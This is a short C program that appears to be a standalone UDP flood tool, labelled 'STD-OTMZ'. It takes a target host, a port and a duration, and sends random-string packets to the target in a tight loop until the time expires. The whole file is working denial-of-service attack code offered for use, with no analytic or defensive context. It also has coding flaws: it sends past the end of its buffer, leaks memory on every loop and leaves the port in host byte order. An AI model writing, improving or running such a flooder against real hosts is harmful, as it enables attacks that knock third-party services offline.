#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>

#define ASCII_START 32
#define ASCII_END 126

char* generateRandomString(int size) {
	int i;
	char *res = malloc(size + 1);
	for(i = 0; i < size; i++) {
		res[i] = (char) (rand()%(ASCII_END-ASCII_START))+ASCII_START;
	}
	res[i] = '\0';
	return res;
}

void STD_Flood(unsigned char *ip, int port, int secs) {
    int iSTD_Sock;
    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        send(iSTD_Sock, generateRandomString(7), 600, 0);
        connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
        if (time(NULL) >= start + secs) {
            close(iSTD_Sock);
			_exit(0);
        }
    }
}
main(int argc, char **argv)
{
	if(argc < 4){
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stderr, "|STD-OTMZ| Syntax: %s <host> <port> <time>\n",argv[0]);
		exit(-1);
	}
      STD_Flood(argv[1], atoi(argv[2]),atoi(argv[3]));
}